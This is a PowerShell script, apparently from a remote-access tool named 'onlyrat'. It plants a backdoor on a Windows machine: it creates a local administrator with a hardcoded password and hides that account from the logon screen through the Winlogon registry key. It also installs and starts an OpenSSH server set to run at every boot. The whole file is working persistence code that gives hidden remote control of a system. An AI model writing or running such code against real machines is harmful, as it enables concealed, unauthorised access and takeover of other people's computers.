## Create random text (8 letters)
function randomText {
  return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}

## Create Local Admin FUNCTION
function createAdmin {
  param (
    [string] $uName,
    [securestring] $pWord
  )
  begin{
  }
  process {
    New-LocalUser -Name "$uName" -Password $pWord -FullName "$uName" -Description "Temporary local admin"
    Add-LocalGroupMember -Group "Administrators" -Member "$uName"
  }
  end{
  }
}

## Temp Directory
## variables
$temp = "$env:temp"
$dirName = randomText

$uName = "onlyrat"
$pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

## goto Temp and start 
Set-Location $temp	
New-Item -Path $temp -Name $dirName -Type Directory
Set-Location $dirName

## Create Admin
createAdmin -uName $uName -pWord $pWord

## Hide Admin with registry
New-Item -Path $regPath -Force
New-ItemProperty -Path $regPath -Name $uName -Value 00000000

## Enable persistent SSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*